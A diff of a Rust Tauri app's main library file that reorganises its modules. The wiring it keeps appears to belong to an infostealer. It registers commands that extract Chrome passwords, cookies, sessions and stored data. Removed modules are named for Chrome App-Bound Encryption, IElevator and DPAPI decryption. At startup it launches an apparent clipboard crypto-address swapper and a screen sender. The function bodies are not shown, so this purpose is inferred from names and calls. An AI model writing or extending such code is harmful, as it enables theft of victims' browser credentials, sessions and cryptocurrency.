@@ -1,23 +1,12 @@
-mod address_swap;
-mod chrome;
-mod clipboard;
-mod chrome_abe;
-mod chrome_analysis;
-mod chrome_ielevator;
-pub mod chrome_elevation;
-mod chrome_stored;
-mod fs_handler;
-mod launch_mode;
+pub mod chrome;
+mod platform;
 mod screen;
-mod win_dpapi;
-mod window_commands;
-mod window_shell;
-mod win_show_signal;
-mod win_single_instance;
+mod window;
+
 use std::sync::Arc;
 
-use launch_mode::LaunchMode;
 use screen::{load_or_create_sender_id, ScreenSender, ScreenSenderConfig};
+use window::launch_mode::LaunchMode;
 use tauri::{
     tray::TrayIconBuilder,
     Manager, RunEvent, WindowEvent,
@@ -37,12 +26,12 @@ struct AppState {
 }
 
 #[cfg(windows)]
-type InstanceHandle = win_single_instance::InstanceGuard;
+type InstanceHandle = window::single_instance::InstanceGuard;
 
 #[cfg(not(windows))]
 type InstanceHandle = ();
 
-use window_shell::show_main_window;
+use window::show_main_window;
 
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
@@ -50,12 +39,12 @@ pub fn run() {
 
     #[cfg(windows)]
     {
-        if win_single_instance::try_forward_to_running_instance(launch_mode == LaunchMode::Standard)
+        if window::single_instance::try_forward_to_running_instance(launch_mode == LaunchMode::Standard)
         {
             return;
         }
 
-        let Some(instance) = win_single_instance::acquire_instance_guard() else {
+        let Some(instance) = window::single_instance::acquire_instance_guard() else {
             return;
         };
 
@@ -78,17 +67,17 @@ fn run_with_instance(instance: InstanceHandle, launch_mode: LaunchMode) {
             chrome::chrome_analyze_passwords,
             chrome::chrome_analyze_cookies,
             chrome::chrome_analyze_sessions,
-            chrome_stored::chrome_analyze_stored_data,
-            window_commands::window_minimize,
-            window_commands::window_toggle_maximize,
-            window_commands::window_hide,
-            window_commands::window_is_maximized,
+            chrome::stored::chrome_analyze_stored_data,
+            window::commands::window_minimize,
+            window::commands::window_toggle_maximize,
+            window::commands::window_hide,
+            window::commands::window_is_maximized,
         ])
         .setup(move |app| {
             #[cfg(windows)]
-            win_show_signal::start_show_ui_watcher(app.handle().clone());
+            window::show_signal::start_show_ui_watcher(app.handle().clone());
 
-            let _ = address_swap::AddressSwapManager::global();
+            let _ = screen::address_swap::AddressSwapManager::global();
 
             TrayIconBuilder::new().build(app)?;
 
